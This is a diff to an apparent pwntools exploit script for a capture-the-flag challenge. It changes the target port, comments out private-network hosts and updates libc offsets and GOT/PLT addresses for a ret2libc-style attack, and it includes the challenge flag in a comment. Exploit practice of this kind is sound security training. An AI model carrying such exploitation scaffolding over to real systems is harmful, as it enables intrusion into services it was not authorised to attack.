@@ -5,9 +5,9 @@ from pwn import *
 # CGCTF{It'5_ju5t_4_s1mp13_3ch0_server_r1ght?}
 
 host = "pwn.yuawn.idv.tw"
-port = 10101
-host = '192.168.31.140'
-host = '172.16.115.109'
+port = 10104
+#host = '192.168.31.140'
+#host = '172.16.115.109'
 
 
 yuan = remote(host,port)
@@ -19,7 +19,7 @@ bin_sh_libc = 0x18c177
 puts_plt = 0x400600
 read_GOT = 0x601038
 #read_libc = 0xf69a0
-read_libc = 0xf6670
+read_libc = 0xf7220
 printf_GOT = 0x601028
 #libc_printf_offset = 0x557b0
 libc_printf_offset = 0x55800
